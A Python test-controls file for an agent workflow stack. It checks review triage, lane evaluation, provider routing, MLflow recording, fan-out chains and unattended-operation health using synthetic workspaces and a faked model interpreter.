"""Controls for the trial steps: the defects review found, and the platform/workflow boundary.

usage: trial_controls.py            (no model call, no network; fake inputs only)

Every control drives the real function from the real module with a synthetic workspace, so it
fails if the fix is reverted. What each group pins:

  triage    a review only counts for the draft it was written for, and only when this round's
            reviews step reports it produced — an older verdict, an emptied file and a document
            that is not a review all block instead of passing
  lanes     one lane's malformed proposal is that lane's INVALID, never the end of the cycle's
            evaluation; NaN is not a weight
  roles     a role is bound only to a provider the router found eligible in this run
  record    a blocked run is recorded as a blocked execution, not as "the router started nothing"
  screen    every recording step's MLflow result reaches the run screen
  boundary  the platform's fan-out capability carries no domain rule, and the workflow's steps
            carry the judgements (CONTRACT.md)
  recorder  a run with several executions is recorded as several runs, one per execution
  chains    a member may be a sequence: its steps run in order, a failed step stops that member
            only, and every step is one execution in the record
  running   unattended operation: one cycle at a time, a skip and a refusal both recorded, and
            the health report counting what actually happened
  trajectory  what a run did, read from what was already recorded, with assertions that are true
            or false — never a judgement of whether the result was any good
  evidence  a judgement points at the call that made it and the artifact it was about, and the
            index travels with the record
  repeat    every step says what a repeat of it does, and the three that would have been wrong
            about it are guarded: freeze, triage's repair count, and the record
  step-rights  a role may run as its own principal, and that reaches the call
  panel     the web surface carries only what needs a person — a login and an approval — and the
            cycle's rules live in one place, whatever calls them
  reduced   a smaller composition may drop recording and the screen — never what the stack's
            guarantees rest on — and a run that loses a capability is refused, not silently run
"""
import importlib.util, json, os, re, shutil, sys, tempfile

sys.path.insert(0, "/work/stack")
sys.path.insert(0, "/work/stack/steps")
import settings as settings_real

PASS, FAIL = [], []


def check(name, got, want):
    (PASS if got == want else FAIL).append((name, got, want))
    print(f"  {'ok  ' if got == want else 'FAIL'}  {name:<58} {got!r}" +
          ("" if got == want else f"  (expected {want!r})"))


def real_ws():
    """A throwaway run directory under the real workspace root, removed by the caller."""
    import secrets
    root = settings_real.runtime()["paths"]["workspace_root"]
    ws = os.path.join(root, "ctl-" + secrets.token_hex(4))
    os.makedirs(ws, exist_ok=True)
    return ws


def load(path, name, ws):
    """Import a step module with its workspace pointed at a temporary directory."""
    os.environ["CONDUCTOR_SELF_RUN_ID"] = os.path.basename(ws)
    spec = importlib.util.spec_from_file_location(name, path)
    m = importlib.util.module_from_spec(spec)
    sys.modules[name] = m
    spec.loader.exec_module(m)
    m.WS = ws
    return m


# ---------------------------------------------------------------- triage
def triage_case(label, *, receipt_draft="d02", produced=True, story=None, history=None,
                tamper=False, no_receipt=False):
    """Freeze d01, review it, repair, freeze d02 — then vary what this round produced."""
    root = tempfile.mkdtemp(prefix="agentstack-triage-")
    ws = os.path.join(root, "run")
    os.makedirs(ws)
    ns = load("/work/packages/novel/steps/novel_stage.py", "novel_stage_ctl", ws)

    open(f"{ws}/draft.md", "w").write("first draft\n")
    ns.cmd_freeze()                                       # d01
    good = {"reviewer": "story", "usable": True, "verdict": "PASS",
            "findings": [{"kind": "NONE", "severity": "MINOR", "what": "fine"}]}
    for n in ("story", "history"):
        json.dump({**good, "reviewer": n}, open(f"{ws}/review_{n}.json", "w"))
    open(f"{ws}/draft.md", "w").write("repaired draft\n")
    ns.cmd_freeze()                                       # d02 — a new round
    meta = json.load(open(f"{ws}/draft_meta.json"))

    members = {}
    for n, doc in (("story", story), ("history", history)):
        if doc is not None:
            json.dump(doc, open(f"{ws}/review_{n}.json", "w"))
        exists = os.path.isfile(f"{ws}/review_{n}.json")
        members[n] = {"artifact": f"review_{n}.json",
                      "status": "COMPLETED" if produced else "FAILED",
                      "produced": produced and exists,
                      "sha256": ns.sha_file(f"{ws}/review_{n}.json") if exists else ""}
    if not no_receipt:
        ctx = meta["draft_sha256"] if receipt_draft == "d02" else "an earlier draft's sha256"
        json.dump({"context": ctx, "members": members},
                  open(f"{ws}/reviews_round.json", "w"))
    if tamper:
        json.dump({**good, "verdict": "PASS", "findings": [{"kind": "NONE", "severity": "MINOR"}]},
                  open(f"{ws}/review_story.json", "w"))

    import io, contextlib
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        ns.cmd_triage("1")
    shutil.rmtree(root, ignore_errors=True)
    return json.loads(buf.getvalue().strip().splitlines()[-1])["decision"]


def controls_triage():
    print("triage — a review counts only for this round's draft")
    ok = {"reviewer": "x", "usable": True, "verdict": "PASS",
          "findings": [{"kind": "NONE", "severity": "MINOR", "what": "fine"}]}
    blocking = {"reviewer": "x", "usable": True, "verdict": "REPAIR",
                "findings": [{"kind": "FACT_ERROR", "severity": "BLOCKING", "what": "wrong"}]}
    check("this round reviewed d02 and found nothing", triage_case("a", story=ok, history=ok), "PASS")
    # the defect: d01's reviews were still on disk, so a failed reviewer passed on the old verdict
    check("a required reviewer failed this round", triage_case("b", produced=False), "BLOCK")
    check("required reviews are empty objects", triage_case("c", story={}, history={}), "BLOCK")
    check("a required review has no findings", triage_case("d", story={"verdict": "PASS", "findings": []},
                                                           history=ok), "BLOCK")
    check("a finding carries no severity", triage_case("e", story={"verdict": "PASS", "findings": [{"kind": "NONE"}]},
                                                       history=ok), "BLOCK")
    check("the receipt names an earlier draft", triage_case("f", receipt_draft="d01", story=ok, history=ok), "BLOCK")
    check("no receipt from this round at all", triage_case("g", no_receipt=True, story=ok, history=ok), "BLOCK")
    check("the file changed after the reviews step", triage_case("h", story=ok, history=ok, tamper=True), "BLOCK")
    check("a blocking finding still repairs", triage_case("i", story=blocking, history=ok), "REPAIR")


# ---------------------------------------------------------------- lanes
def controls_lanes():
    print("lanes — a malformed proposal is one lane's result")
    root = tempfile.mkdtemp(prefix="agentstack-lanes-")
    ws = os.path.join(root, "run")
    os.makedirs(ws)
    ts = load("/work/packages/trading/steps/trade_stage.py", "trade_stage_ctl", ws)
    _, packet, body, _ = ts.build_packet()
    open(f"{ws}/packet.json", "w", encoding="utf-8").write(body)
    syms = [s["symbol"] for s in packet["universe"]][:3]
    good = {"lane": "base", "model_calls": 0, "refs": [],
            "targets": [{"symbol": s, "weight": 0.2} for s in syms]}
    broken = {
        "empty_list": [],
        "null_target": {"targets": [None]},
        "bad_calls": {"targets": [{"symbol": syms[0], "weight": 0.2}], "model_calls": "two"},
        "nan_weight": {"targets": [{"symbol": syms[0], "weight": float("nan")}]},
        "symbol_list": {"targets": [{"symbol": [syms[0]], "weight": 0.2}]},
        "refs_string": {"targets": [{"symbol": syms[0], "weight": 0.2}], "refs": "EV-001"},
    }
    json.dump(good, open(f"{ws}/lane_base.json", "w"))
    for name, doc in broken.items():
        json.dump(doc, open(f"{ws}/lane_{name}.json", "w"))
    open(f"{ws}/lane_syntax.json", "w").write("{not json")

    import io, contextlib
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        ts.cmd_evaluate()
    res = json.loads(buf.getvalue().strip().splitlines()[-1])
    rows = {r["lane"]: r for r in json.loads(res["report"])}
    check("the evaluation finished at all", res["status"], "OK")
    check("the sound lane is still scored", rows.get("base", {}).get("status"), "VALID")
    for name in list(broken) + ["syntax"]:
        check(f"{name} is that lane's INVALID", rows.get(name, {}).get("status"), "INVALID")
    check("a report was written", os.path.isfile(f"{ws}/report.json"), True)
    check("the comparison still names a best lane", res["best_lane"], "base")
    shutil.rmtree(root, ignore_errors=True)


# ---------------------------------------------------------------- roles
def controls_roles():
    print("roles — a role is bound only to a provider the router admitted")
    import subprocess
    root = tempfile.mkdtemp(prefix="agentstack-roles-")
    ev = os.path.join(root, "route")
    os.makedirs(ev)

    def run(evaluated, args=("architect=codex", "author=claude", "cold=grok")):
        if evaluated is not None:
            json.dump({"decision": "ROUTE", "provider": "grok", "reason": "x",
                       "evaluated": evaluated}, open(f"{ev}/decision.json", "w"))
        elif os.path.isfile(f"{ev}/decision.json"):
            os.remove(f"{ev}/decision.json")
        p = subprocess.run(["/opt/venv/bin/python", "/work/stack/steps/roles.py",
                            "research-default", ev, *args], capture_output=True, text=True)
        return json.loads(p.stdout.strip().splitlines()[-1])

    all_ok = [{"provider": p, "eligible": True, "why": "within limits"}
              for p in ("codex", "claude", "grok")]
    r = run(all_ok)
    check("every provider eligible → bound", (r["ok"], r["author_provider"]), ("yes", "claude"))
    # the defect: quota exhausted on two vendors, their roles were still returned as ok
    exhausted = [{"provider": "codex", "eligible": False, "why": "exhausted: weekly 99% >= 80%"},
                 {"provider": "claude", "eligible": False, "why": "exhausted: session 95% >= 80%"},
                 {"provider": "grok", "eligible": True, "why": "within limits"}]
    r = run(exhausted)
    check("exhausted providers are not bound", (r["ok"], r["author_provider"], r["architect_provider"]),
          ("no", "", ""))
    check("the eligible one is still bound", r["cold_provider"], "grok")
    check("the reason travels with it", "exhausted" in r["ineligible"], True)
    r = run([{"provider": "codex", "eligible": True, "why": ""}])
    check("a provider the router did not evaluate", (r["ok"], r["author_provider"]), ("no", ""))
    r = run(None)
    check("no router evaluation to read → fail closed", r["ok"], "no")
    r = run(all_ok, args=("author=gemini",))
    check("a provider the profile does not carry", (r["ok"], r["missing"].split(" ")[0]),
          ("no", "author:gemini"))
    shutil.rmtree(root, ignore_errors=True)


# ---------------------------------------------------------------- record + screen
def controls_record_and_screen():
    print("record / screen — a blocked run is recorded as one, and every record reaches the screen")
    y = open("/work/packages/novel/novel-a.yaml", encoding="utf-8").read()
    block = y.split("- name: record_block", 1)[1].split("- name: record_hold", 1)[0]
    check("record_block sends an execute record", "'execute'" in block, True)
    check("record_block sends the triage reason", "triage.output.reason" in block, True)
    check("record_hold still sends none (a real HOLD)",
          "'execute'" in y.split("- name: record_hold", 1)[1].split("routes:", 1)[0], False)

    src = open("/work/stack/run_workflow.py", encoding="utf-8").read()
    conds = re.findall(r'elif t == "script_completed" and (.+?):\n', src)
    cond = next((c for c in conds if "record" in c), "")
    for step in ("record", "record_hold", "record_pass", "record_block", "record_cycle"):
        check(f"the screen reads {step}", bool(eval(cond, {"d": {"agent_name": step}, "str": str})), True)
    check("an unrelated step is not read as a record",
          bool(eval(cond, {"d": {"agent_name": "route"}, "str": str})), False)


# ------------------------------------------------- the fan-out steps, with the real fanout module
# Why this exists: the triage controls build `reviews_round.json` themselves, so they never call
# the step that writes it. A review of the published tree found `novel_reviews.py` calling
# `fanout.run_all(jobs, ledger=…)` against a `run_all(jobs)` — the step died with a TypeError
# before a single reviewer started, and nothing here noticed. These controls run the real step
# modules with the real `fanout`, replacing only the interpreter that would start a model call.
STUB = '''#!/bin/sh
# Stands in for the step's interpreter: $1 is the script it would have run. Only the routed call
# is faked — a chain runner is a step of the platform under test, so it runs for real.
case "$1" in
  */task_chain.py) exec /opt/venv/bin/python "$@";;
esac
shift
label=$3; expected=$5
if [ "$label" = "$CTL_FAIL" ]; then echo '{"status":"FAILED","produced":false}'; exit 1; fi
printf '%s' "$CTL_DOC" > "$CTL_WS/$expected"
echo '{"status":"COMPLETED","produced":true,"run_id":"ctl"}'
'''


def run_step(path, name, argv, ws, doc, fail="", scratch=None):
    """Import and run a fan-out step with its workspace and its child interpreter faked.

    The workspace lives under the real workspace root, because a chained member runs in its own
    process: that process reads the stack's own settings, and a temporary directory invented here
    would not be the one it looks in.
    """
    import contextlib, io, types
    root = scratch or tempfile.mkdtemp(prefix="agentstack-scratch-")
    stub = os.path.join(root, "stub.sh")
    with open(stub, "w", newline="\n") as f:
        f.write(STUB)
    os.chmod(stub, 0o755)

    fake = types.ModuleType("settings")
    fake.runtime = lambda: {"paths": {"workspace_root": os.path.dirname(ws),
                                      "evidence_root": os.path.join(root, "evidence")}}
    fake.profile = lambda n=None: {}
    saved_settings, saved_argv = sys.modules.get("settings"), sys.argv
    sys.modules["settings"] = fake
    os.environ.update({"CONDUCTOR_SELF_RUN_ID": os.path.basename(ws), "POC_PY": stub,
                       "CTL_WS": ws, "CTL_DOC": doc, "CTL_FAIL": fail})
    sys.argv = [name, *argv]
    buf = io.StringIO()
    try:
        spec = importlib.util.spec_from_file_location(name, path)
        m = importlib.util.module_from_spec(spec)
        sys.modules[name] = m
        with contextlib.redirect_stdout(buf):
            spec.loader.exec_module(m)
        return json.loads(buf.getvalue().strip().splitlines()[-1])
    except Exception as e:                       # a broken step is the finding, not a crash here
        return {"status": f"{type(e).__name__}: {e}"}
    finally:
        sys.argv = saved_argv
        if saved_settings is not None:
            sys.modules["settings"] = saved_settings
        for k in ("POC_PY", "CTL_WS", "CTL_DOC", "CTL_FAIL"):
            os.environ.pop(k, None)


def controls_reviews_step():
    print("reviews step — the real step, the real fanout, no model call")
    ok = json.dumps({"reviewer": "x", "usable": True, "verdict": "PASS",
                     "findings": [{"kind": "NONE", "severity": "MINOR", "what": "fine"}]})
    specs = ["story:claude:claude:direct:/work/packages/novel/prompts/novel-review-story.md:review_story.json",
             "history:codex:codex:direct:/work/packages/novel/prompts/novel-review-history.md:review_history.json",
             "cold:grok:grok:direct:/work/packages/novel/prompts/novel-cold.md:review_cold.json"]

    for label, fail, want_triage in (("every reviewer produced", "", "PASS"),
                                     ("a required reviewer failed", "history", "BLOCK")):
        root = tempfile.mkdtemp(prefix="agentstack-step-")
        ws = real_ws()
        ns = load("/work/packages/novel/steps/novel_stage.py", f"ns_{fail or 'all'}", ws)
        open(f"{ws}/draft.md", "w").write("a draft\n")
        ns.cmd_freeze()
        meta = json.load(open(f"{ws}/draft_meta.json"))

        res = run_step("/work/stack/steps/tasks.py", f"nr_{fail or 'all'}",
                       ["reviews_round.json", meta["draft_sha256"], "research-default", *specs],
                       ws, ok, fail)
        check(f"{label}: the step ran", res.get("status"), "OK")
        rec_path = f"{ws}/reviews_round.json"
        check(f"{label}: a receipt was written", os.path.isfile(rec_path), True)
        rec = json.load(open(rec_path)) if os.path.isfile(rec_path) else {}
        check(f"{label}: the receipt carries this draft's context", rec.get("context"),
              meta["draft_sha256"])
        if fail:
            check(f"{label}: the failed member is reported, the others produced",
                  (rec.get("members", {}).get("history", {}).get("produced"),
                   res.get("produced"), res.get("failed")), (False, 2, "history"))
        else:
            check(f"{label}: each member carries its file's sha256",
                  rec.get("members", {}).get("story", {}).get("sha256"),
                  ns.sha_file(f"{ws}/review_story.json"))
            check(f"{label}: the capability reports an overlap", isinstance(res.get("overlap"), float), True)
            check(f"{label}: the capability names no domain rule",
                  ("required" in json.dumps(res)) or ("advisory" in json.dumps(res)), False)

        import contextlib, io
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            ns.cmd_triage("1")
        check(f"{label}: triage then decides", json.loads(buf.getvalue().strip().splitlines()[-1])["decision"],
              want_triage)
        shutil.rmtree(root, ignore_errors=True)
        shutil.rmtree(ws, ignore_errors=True)


def controls_lanes_step():
    print("lanes step — the real step, the real fanout, no model call")
    root = tempfile.mkdtemp(prefix="agentstack-lanestep-")
    ws = real_ws()
    ts = load("/work/packages/trading/steps/trade_stage.py", "ts_step", ws)
    _, packet, body, _ = ts.build_packet()
    open(f"{ws}/packet.json", "w", encoding="utf-8").write(body)
    syms = [s["symbol"] for s in packet["universe"]][:2]
    doc = json.dumps({"lane": "ai", "model_calls": 1, "refs": [],
                      "targets": [{"symbol": s, "weight": 0.2} for s in syms]})
    ts.cmd_baseline("base")                      # the workflow's own step, no model call
    specs = ["ai:codex:codex:direct:/work/packages/trading/prompts/trade-lane.md:lane_ai.json",
             "ai2:claude:claude:direct:/work/packages/trading/prompts/trade-lane2.md:lane_ai2.json"]
    res = run_step("/work/stack/steps/tasks.py", "tl_step",
                   ["lanes_round.json", "packet-sha", "research-default", *specs],
                   ws, doc, fail="ai2")
    check("the step ran", res.get("status"), "OK")
    check("two model lanes, one produced", (res.get("tasks"), res.get("produced")), (2, 1))
    check("the failed lane is named and alone", res.get("failed"), "ai2")
    check("the deterministic lane needed no model", os.path.isfile(f"{ws}/lane_base.json"), True)
    check("the receipt carries the cycle's packet",
          json.load(open(f"{ws}/lanes_round.json")).get("context"), "packet-sha")
    shutil.rmtree(root, ignore_errors=True)
    shutil.rmtree(ws, ignore_errors=True)


# ---------------------------------------------------------------- the recorder
def controls_recorder():
    """Drive the real recorder with its network calls captured, so nothing is written anywhere."""
    print("recorder — one MLflow run per execution, under the run's own")
    import importlib.util
    spec = importlib.util.spec_from_file_location("record_ctl", "/work/stack/steps/record.py")
    rec = importlib.util.module_from_spec(spec)
    sys.modules["record_ctl"] = rec
    spec.loader.exec_module(rec)

    sent = []
    ids = iter(f"rid{n}" for n in range(1, 99))

    def fake_call(path, body=None, method="POST"):
        sent.append((path, body))
        if "get-by-name" in path:
            return {"experiment": {"experiment_id": "7"}}
        if path.endswith("runs/create"):
            return {"run": {"info": {"run_id": next(ids)}}}
        return {}
    rec.call = fake_call
    rec.put_artifact = lambda *a: None

    def ex(run_id, provider, status="COMPLETED", tokens=None):
        return {"run_id": run_id, "provider": provider, "status": status, "model_route": "direct",
                "model_session_reported": "default", "model_adapter_reported": "",
                "model_served": "unknown", "evidence_dir": "/nowhere", "profile": "research-default",
                "approvals_requested": 0, "mcp_rule_denials": 0,
                "measurements": {"total_tokens": tokens} if tokens else {}}

    root = tempfile.mkdtemp(prefix="agentstack-rec-")
    receipt = os.path.join(root, "lanes_round.json")
    json.dump({"context": "packet-sha", "members": {
        "ai": {"provider": "codex", "produced": True, "result": ex("run-ai", "codex", tokens=11)},
        "ai2": {"provider": "claude", "produced": False,
                "result": ex("run-ai2", "claude", status="FAILED")}}},
        open(receipt, "w"))
    check_ = {"decision": "CYCLE", "reason": "best ai", "file_sha256": "abc"}
    route = {"decision": "ROUTE", "reason": "codex: within limits", "profile": "research-default"}

    def runs_of():
        return [b for p, b in sent if p.endswith("runs/create")]

    def tags_of(rid):
        for p, b in sent:
            if p.endswith("log-batch") and b.get("run_id") == rid:
                return {t["key"]: t["value"] for t in b.get("tags", [])}
        return {}

    def metrics_of(rid):
        for p, b in sent:
            if p.endswith("log-batch") and b.get("run_id") == rid:
                return {m["key"]: m["value"] for m in b.get("metrics", [])}
        return {}

    # one execution: unchanged — a single run named after it
    sent.clear()
    out = rec.record({"execute": ex("solo", "claude"), "check": check_, "route": route})
    check("one execution is still one run", (out["executions"], out["children"]), (1, 0))
    check("the run is named after the execution",
          [r["run_name"] for r in runs_of()], ["solo"])
    check("it carries the gate decision", tags_of(out["mlflow_run_id"]).get("gate.decision"), "CYCLE")

    # several: a parent and a child per execution
    sent.clear()
    out = rec.record({"receipts": [receipt], "check": check_, "route": route,
                      "measurements": {"valid_lanes": 3}})
    check("both lanes are recorded", (out["executions"], out["children"]), (2, 2))
    parent = out["mlflow_run_id"]
    kids = [r["run_id"] for p, r in sent if p.endswith("log-batch")
            and r["run_id"] != parent]
    check("each child points at the parent",
          sorted({tags_of(k).get("mlflow.parentRunId") for k in kids}), [parent])
    check("each child keeps its own provider",
          sorted(tags_of(k).get("provider") for k in kids), ["claude", "codex"])
    check("each child keeps its member name",
          sorted(tags_of(k).get("member") for k in kids), ["ai", "ai2"])
    check("a lane's own numbers stay with the lane",
          [metrics_of(k).get("total_tokens") for k in kids if tags_of(k).get("member") == "ai"], [11.0])
    check("the parent carries the run's numbers", metrics_of(parent).get("valid_lanes"), 3.0)
    check("the parent says how many executions there were",
          (metrics_of(parent).get("executions"), metrics_of(parent).get("executions_completed")),
          (2.0, 1.0))
    check("one failed lane makes the run partial", tags_of(parent).get("status"), "PARTIAL")
    check("no execution is counted twice",
          rec.record({"execute": ex("run-ai", "codex"), "receipts": [receipt],
                      "check": check_, "route": route})["executions"], 2)

    # nothing ran at all — and the two runs that look like this are not the same run
    sent.clear()
    out = rec.record({"check": {}, "route": route})
    check("a run the router held is still recorded",
          (out["executions"], tags_of(out["mlflow_run_id"]).get("status"),
           tags_of(out["mlflow_run_id"]).get("gate.decision")), (0, "HOLD", "NOT_RUN"))
    sent.clear()
    out = rec.record({"check": check_, "route": route, "idempotency_key": "noexec-judged"})
    t = tags_of(out["mlflow_run_id"])
    check("a run that judged without calling a model keeps its judgement",
          (out["executions"], t.get("status"), t.get("gate.decision"), t.get("gate.reason")),
          (0, "NO_EXECUTION", "CYCLE", "best ai"))

    # a receipt that cannot be read is reported, not guessed at
    out = rec.record({"execute": ex("solo", "claude"), "receipts": ["/nowhere/x.json"],
                      "check": check_, "route": route})
    check("an unreadable receipt is named in the error",
          ("x.json" in out["record_error"], out["executions"]), (True, 1))
    shutil.rmtree(root, ignore_errors=True)


# ---------------------------------------------------------------- the boundary itself
DOMAIN_WORDS = ("review", "reviewer", "lane", "draft", "packet", "chapter", "trading", "novel",
                "required", "advisory", "blocking", "verdict")


def controls_boundary():
    print("boundary — the capability knows no domain, the workflow keeps the judgement")
    cap = open("/work/stack/steps/tasks.py", encoding="utf-8").read()
    body = "\n".join(l for l in cap.splitlines()
                     if not l.lstrip().startswith("#") and "Conductor" not in l)
    body = body.split('"""', 2)[-1].lower()          # code only, not the module's explanation
    found = sorted({w for w in DOMAIN_WORDS if w in body})
    check("no domain vocabulary in the capability's code", found, [])
    for name, path, want in (
            ("what is required", "/work/packages/novel/steps/novel_stage.py", "required"),
            ("what a valid proposal is", "/work/packages/trading/steps/trade_stage.py", "INVALID"),
            ("the deterministic baseline", "/work/packages/trading/steps/trade_stage.py", "momentum20")):
        check(f"the workflow still owns: {name}", want in open(path, encoding="utf-8").read(), True)
    check("nothing imports the removed fan-out wrappers",
          any(os.path.exists(p) for p in ("/work/stack/steps/novel_reviews.py",
                                          "/work/stack/steps/trade_lanes.py")), False)
    y = open("/work/packages/novel/novel-a.yaml", encoding="utf-8").read()
    check("the reviews step names the capability", "steps/tasks.py" in y, True)
    check("the triage step is told what is required", '"story,history"' in y, True)


# ---------------------------------------------------------------- members that are chains
def controls_chains():
    print("chains — a lane may be a sequence of steps, and stays one lane's business")
    root = tempfile.mkdtemp(prefix="agentstack-chain-")
    ws = real_ws()
    ts = load("/work/packages/trading/steps/trade_stage.py", "ts_chain", ws)
    _, packet, body, _ = ts.build_packet()
    open(f"{ws}/packet.json", "w", encoding="utf-8").write(body)
    syms = [x["symbol"] for x in packet["universe"]][:2]
    doc = json.dumps({"model_calls": 1, "refs": [],
                      "targets": [{"symbol": s, "weight": 0.2} for s in syms]})

    plan = {"members": [
        {"label": "chain", "steps": [
            {"kind": "model", "name": "s1", "provider": "codex", "login": "codex",
             "route": "direct", "prompt": "/p1.md", "expected": "lane_chain.json"},
            {"kind": "script", "name": "s2", "expected": "",
             "argv": ["/bin/sh", "-c", "echo '{\"status\":\"OK\"}'"]},
            {"kind": "model", "name": "s3", "provider": "claude", "login": "claude",
             "route": "direct", "prompt": "/p2.md", "expected": "lane_chain.json"}]},
        {"label": "solo", "steps": [
            {"kind": "model", "name": "t1", "provider": "grok", "login": "grok",
             "route": "direct", "prompt": "/p3.md", "expected": "lane_solo.json"}]}]}
    pp = os.path.join(root, "plan.json")
    json.dump(plan, open(pp, "w"), ensure_ascii=False)

    res = run_step("/work/stack/steps/tasks.py", "tasks_chain",
                   ["lanes_round.json", "packet-sha", "research-default", "--plan", pp],
                   ws, doc)
    check("the plan ran", res.get("status"), "OK")
    check("two members, both produced", (res.get("tasks"), res.get("produced")), (2, 2))
    check("the calls are counted, not the members", res.get("model_calls"), 3)
    rec = json.load(open(f"{ws}/lanes_round.json"))
    chain = rec["members"]["chain"]["result"]
    check("the chain ran its steps in order",
          [st["step"] for st in chain["steps"]], ["s1", "s2", "s3"])
    check("a script step inside a lane is not a model call", chain["model_calls"], 2)

    # a step that produces nothing stops its own member and no other
    res = run_step("/work/stack/steps/tasks.py", "tasks_chain_fail",
                   ["lanes_round.json", "packet-sha", "research-default", "--plan", pp],
                   ws, doc, fail="s1")
    check("a failed step stops its member", res.get("failed"), "chain")
    check("the other member is untouched", res.get("produced"), 1)
    rec = json.load(open(f"{ws}/lanes_round.json"))
    check("the failed step is named",
          rec["members"]["chain"]["result"]["failed_step"], "s1")
    check("the rest of the chain did not run",
          rec["members"]["chain"]["result"]["steps_run"], 1)

    # the recorder turns a chain into one execution per call
    import importlib.util
    spec = importlib.util.spec_from_file_location("record_chain", "/work/stack/steps/record.py")
    rec_mod = importlib.util.module_from_spec(spec)
    sys.modules["record_chain"] = rec_mod
    spec.loader.exec_module(rec_mod)
    receipt = os.path.join(root, "receipt.json")
    ex = lambda rid, prov: {"run_id": rid, "provider": prov, "status": "COMPLETED",
                            "model_session_reported": "", "model_adapter_reported": "",
                            "model_served": "", "evidence_dir": "", "kind": "model"}
    json.dump({"context": "c", "members": {"chain": {"produced": True, "result": {
        "run_id": "m", "steps": [{**ex("a", "codex"), "step": "s1"},
                                 {"run_id": "", "kind": "script", "step": "s2"},
                                 {**ex("b", "claude"), "step": "s3"}]}}}},
        open(receipt, "w"))
    found, errs = rec_mod.executions_of({"receipts": [receipt]})
    check("a chain is recorded call by call",
          [e["member"] for e in found], ["chain:s1", "chain:s3"])
    check("its script step is not an execution", len(found), 2)

    # a lane that produced nothing is still in the comparison (its own workspace: the chain above
    # left its artifact behind, and this asks what the comparison does with a lane that is absent)
    shutil.rmtree(ws, ignore_errors=True)
    ws = real_ws()
    open(f"{ws}/packet.json", "w", encoding="utf-8").write(body)
    ts2 = load("/work/packages/trading/steps/trade_stage.py", "ts_missing", ws)
    json.dump({"members": [{"label": "GONE", "steps": []}, {"label": "solo", "steps": []}]},
              open(f"{ws}/lanes_plan.json", "w"))
    json.dump({"lane": "solo", "model_calls": 1, "refs": [],
               "targets": [{"symbol": syms[0], "weight": 0.2}]}, open(f"{ws}/lane_solo.json", "w"))
    import contextlib, io
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        ts2.cmd_evaluate()
    out = json.loads(buf.getvalue().strip().splitlines()[-1])
    check("a planned lane that produced nothing is MISSING, not absent",
          (out.get("missing"), out["lanes"]), ("GONE", 2))
    check("and it is not counted as valid", out["valid"], 1)
    shutil.rmtree(root, ignore_errors=True)
    shutil.rmtree(ws, ignore_errors=True)


# ---------------------------------------------------------------- unattended operation
def controls_running():
    print("running — what a week of unattended cycles leaves behind, and what it says")
    import importlib.util
    spec = importlib.util.spec_from_file_location("ops_health_ctl", "/work/stack/ops_health.py")
    oh = importlib.util.module_from_spec(spec)
    sys.modules["ops_health_ctl"] = oh
    spec.loader.exec_module(oh)

    rows = [
        {"at": "t1", "ui": "a", "seconds": 40, "outcome": {"ended_at": "done_cycle", "mlflow": True}},
        {"at": "t2", "skipped": "busy"},
        {"at": "t3", "ui": "b", "seconds": 80, "outcome": {"ended_at": "done_hold", "mlflow": True}},
        {"at": "t4", "refused": {"missing": ["record"], "why": {"record": "nothing recorded"}}},
        {"at": "t5", "ui": "c", "seconds": 60,
         "outcome": {"ended_at": "done_cycle", "mlflow": False, "record_error": "URLError"}},
    ]
    r = oh.summarise(rows)
    check("a skipped cycle is not counted as a cycle", r["cycles_recorded"], 3)
    check("a skip is counted as a skip", r["skipped_busy"], 1)
    check("a refusal is counted, with its reason", (r["refused"], r["refused_why"]),
          (1, [["record"]]))
    check("how cycles ended is counted", r["ended"], {"done_cycle": 2, "done_hold": 1})
    check("durations are reported as a spread",
          (r["seconds"]["min"], r["seconds"]["median"], r["seconds"]["max"]), (40, 60, 80))
    check("a cycle that never reached MLflow is visible", r["not_in_mlflow"], 1)
    check("and its error is carried", r["record_errors"][-1][1], "URLError")
    check("nothing at all is not an error", oh.summarise([])["cycles_recorded"], 0)

    # a lock nobody released: visible, and never cleared by the thing that would be blocked by it
    d = tempfile.mkdtemp(prefix="agentstack-lock-")
    check("no lock is not a problem", oh.stuck_lock(os.path.join(d, "none")), None)
    open(os.path.join(d, "started"), "w").write("2026-09-23T04:00:00Z")
    open(os.path.join(d, "started_epoch"), "w").write(str(int(__import__("time").time()) - 3600))
    held = oh.stuck_lock(d)
    check("a held lock is reported with its age", (held["since"], held["age_s"] >= 3600),
          ("2026-09-23T04:00:00Z", True))
    shutil.rmtree(d, ignore_errors=True)

    # the rules live in stack/cycle.py — the shell script is only how a scheduler reaches them
    cyc = open("/work/stack/cycle.py", encoding="utf-8").read()
    check("a cycle takes the lock before starting anything", "os.mkdir(LOCK)" in cyc, True)
    check("a busy scheduler tick is skipped, not queued", '"skipped": "busy"' in cyc, True)
    check("a stale lock is reported, never broken here",
          ("shutil.rmtree" in cyc) or ("rm -rf" in cyc), False)
    check("a skip says how long the lock has been held", "lock_age_s" in cyc, True)
    check("a stack that cannot run it exits 3", "SystemExit(3" in cyc, True)
    check("nothing is deleted unless retention is asked for",
          "if retain_days or retain_keep:" in cyc, True)
    soak = open("/work/scripts/soak.sh", encoding="utf-8").read()
    check("the soak measures without cleaning up", "cleanup" not in soak.split("#!")[1].split("set -u")[1], True)


# ---------------------------------------------------------------- what a run did
def controls_trajectory():
    print("trajectory — the ground an evaluation stands on, and not the evaluation")
    import importlib.util as il
    spec = il.spec_from_file_location("traj_ctl", "/work/stack/trajectory.py")
    tj = il.module_from_spec(spec)
    sys.modules["traj_ctl"] = tj
    spec.loader.exec_module(tj)

    # a run as its records describe it — the reader is driven with a synthetic view
    view = {"ui_id": "u1", "workflow": "novel-a", "profile": "research-default",
            "suite": "s1", "state": "finished", "terminated_at": "done_pass",
            "conductor_run": "abcd1234", "workspace_prefix": "/nowhere",
            "inputs": {"max_repairs": "1"}, "output": {"decision": "PASS", "repairs": 1},
            "capabilities": {"record": True}, "mlflow": {"run_id": "r1"},
            "steps": [{"step": "route"}, {"step": "author"}, {"step": "done_pass"}]}
    calls = [
        {"call": "abcd1234-author-claude", "provider": "claude", "principal": "novel-author",
         "status": "COMPLETED", "permission_requests": 2, "approvals_requested": 1,
         "decided_by_rules": 1, "rule_denials": 0, "tokens": 100, "wall_ms": 1000, "attempts": 2},
        {"call": "abcd1234-story-codex", "provider": "codex", "principal": "novel-reviewer",
         "status": "COMPLETED", "permission_requests": 1, "approvals_requested": 0,
         "decided_by_rules": 1, "rule_denials": 1, "tokens": 50, "wall_ms": 500, "attempts": 1},
    ]
